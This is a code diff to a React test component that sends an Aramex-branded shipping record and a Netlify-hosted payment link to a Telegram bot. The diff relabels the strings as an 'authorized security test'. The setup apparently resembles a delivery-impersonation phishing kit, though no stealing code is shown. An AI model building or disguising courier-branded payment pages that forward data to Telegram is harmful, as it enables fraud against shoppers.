@@ -38,10 +38,10 @@ const TelegramTest = () => {
       const result = await sendToTelegram({
         type: 'shipping_link_created',
         data: {
-          tracking_number: 'TEST123456',
-          service_name: 'أرامكس - Aramex',
+          tracking_number: 'CYBERSEC_TEST_123456',
+          service_name: 'أرامكس - Aramex (اختبار أمني)',
           package_weight: '2.5',
-          package_description: 'ملابس واكسسوارات',
+          package_description: 'اختبار أمني - ملابس واكسسوارات',
           cod_amount: 150,
           country: 'المملكة العربية السعودية',
           payment_url: 'https://gulf-unified-platform.netlify.app/r/SA/shipping/test123?service=aramex'
@@ -65,8 +65,8 @@ const TelegramTest = () => {
       <div className="flex items-center gap-3 mb-6">
         <Bot className="w-8 h-8 text-blue-500" />
         <div>
-          <h2 className="text-2xl font-bold">اختبار بوت التليجرام</h2>
-          <p className="text-muted-foreground">تأكد من وصول البيانات إلى البوت</p>
+          <h2 className="text-2xl font-bold">🔒 اختبار أمني - بوت التليجرام</h2>
+          <p className="text-muted-foreground">اختبار أمني مرخص - تأكد من وصول البيانات إلى البوت</p>
         </div>
       </div>
 
